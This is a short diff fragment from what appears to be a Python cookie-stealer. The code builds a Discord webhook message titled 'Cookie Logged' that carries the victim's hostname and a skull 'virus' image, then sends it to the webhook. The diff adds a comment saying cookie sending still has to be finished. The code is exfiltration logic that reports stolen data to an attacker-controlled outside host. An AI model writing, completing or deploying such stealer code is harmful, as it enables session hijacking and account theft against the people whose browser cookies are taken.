@@ -10,3 +10,4 @@ embed = DiscordEmbed(title='Cookie Logged', description='Hostname: ' + hostname 
 embed.set_image(url='https://media.istockphoto.com/vectors/red-skull-digital-logic-zero-and-one-number-for-virus-security-vector-id1321281110?k=20&m=1321281110&s=612x612&w=0&h=FK8S0n3lYPY7UqRrPH5w98nfvL_GS-i71Qvk-MlW6dY=')
 webhook.add_embed(embed)
 response = webhook.execute()
+#Not done just gotta finish cookie sending
